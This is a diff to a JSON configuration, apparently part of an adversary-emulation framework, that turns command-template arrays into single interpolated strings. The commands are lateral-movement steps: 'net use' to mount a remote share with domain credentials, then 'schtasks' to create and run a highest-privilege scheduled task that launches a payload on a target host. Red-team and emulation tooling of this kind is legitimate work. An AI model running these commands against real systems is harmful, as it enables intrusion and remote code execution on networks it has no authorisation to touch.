@@ -822,18 +822,7 @@
                 "target_1": "self.target_2",
                 "target_2": "self.target_3",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "net use \\\\",
-                            "self.target_3_hostname",
-                            " /User:",
-                            "self.target_3_username",
-                            "@",
-                            "self.domain",
-                            " ",
-                            "self.target_3_password"
-                        ]
-                    }
+                    "command": "net use \\\\${self.target_3_hostname} /User:${self.target_3_username}@${self.domain} ${self.target_3_password}"
                 }
             }
         },
@@ -859,30 +848,7 @@
                 "target_1": "self.target_2",
                 "target_2": "self.target_3",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN ",
-                            "self.target_3_taskname",
-                            " /TR ",
-                            "self.target_3_file_location",
-                            "\\",
-                            "self.payload_name",
-                            " /RL Highest /U ",
-                            "self.target_3_username",
-                            "@",
-                            "self.domain",
-                            " /P ",
-                            "self.target_3_password",
-                            " /RU ",
-                            "self.target_3_username",
-                            "@",
-                            "self.domain",
-                            " /RP ",
-                            "self.target_3_password",
-                            " /S ",
-                            "self.target_3_hostname"
-                        ]
-                    }
+                    "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN ${self.target_3_taskname} /TR ${self.target_3_file_location}\\${self.payload_name} /RL Highest /U ${self.target_3_username}@${self.domain} /P ${self.target_3_password} /RU ${self.target_3_username}@${self.domain} /RP ${self.target_3_password} /S ${self.target_3_hostname}"
                 }
             }
         },
@@ -897,20 +863,7 @@
                 "target_1": "self.target_2",
                 "target_2": "self.target_3",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "cmd.exe /c schtasks.exe /run /tn ",
-                            "self.target_3_taskname",
-                            " /U ",
-                            "self.target_3_username",
-                            "@",
-                            "self.domain",
-                            " /P ",
-                            "self.target_3_password",
-                            " /S ",
-                            "self.target_3_hostname"
-                        ]
-                    }
+                    "command": "cmd.exe /c schtasks.exe /run /tn ${self.target_3_taskname} /U ${self.target_3_username}@${self.domain} /P ${self.target_3_password} /S ${self.target_3_hostname}"
                 }
             }
         },
